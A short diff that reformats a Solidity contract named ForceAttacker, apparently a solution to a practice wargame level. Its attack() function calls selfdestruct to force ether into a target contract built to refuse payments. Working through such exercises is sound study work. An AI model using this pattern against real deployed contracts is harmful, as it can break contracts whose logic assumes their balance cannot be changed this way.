@@ -10,10 +10,9 @@ contract ForceAttacker {
         target = Force(_target);
     }
 
-    function attack () public {
+    function attack() public {
         selfdestruct(payable(address(target)));
     }
 
-    receive() external payable{}
-
+    receive() external payable {}
 }
